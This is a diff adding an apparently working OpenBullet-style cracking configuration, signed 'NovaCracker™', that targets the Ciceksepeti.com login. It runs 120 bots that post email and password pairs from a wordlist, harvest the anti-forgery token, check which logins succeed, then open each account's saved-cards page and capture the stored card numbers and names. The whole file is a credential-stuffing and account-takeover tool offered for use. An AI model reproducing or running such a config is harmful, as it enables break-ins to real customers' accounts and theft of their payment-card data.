@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Ciceksepeti.com",
+  "SuggestedBots": 120,
+  "LastModified": "2019-05-04T13:10:37.1495835+03:00",
+  "AdditionalInfo": "",
+  "Author": "NovaCracker™",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Giriş_GT REQUEST GET "https://www.ciceksepeti.com/Customer/Login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.ciceksepeti.com" 
+  HEADER "referer: https://www.ciceksepeti.com/uye-girisi" 
+#Token PARSE "<SOURCE>" LR "RequestVerificationToken\" type=\"hidden\" value=\"" "\"" -> VAR "Token" 
+#Giriş REQUEST POST "https://www.ciceksepeti.com/Customer/Login" 
+  CONTENT "Email=<USER>&Password=<PASS>&__RequestVerificationToken=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.ciceksepeti.com" 
+  HEADER "referer: https://www.ciceksepeti.com/uye-girisi" 
+#Kontrol KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"Success\":true,\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"Success\":false" 
+#Profil REQUEST GET "https://www.ciceksepeti.com/hesabim/kartlarim" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.ciceksepeti.com" 
+  HEADER "referer: https://www.ciceksepeti.com/uye-girisi" 
+#Kayıtlı PARSE "<SOURCE>" LR "<p class=\"registered-card__number\">" "</p>" Recursive=TRUE -> CAP "No: " 
+PARSE "<SOURCE>" LR "<p class=\"registered-card__name\"><span>" "</span> <a href=\"javascript:;\" " Recursive=TRUE -> CAP "Kart: " 
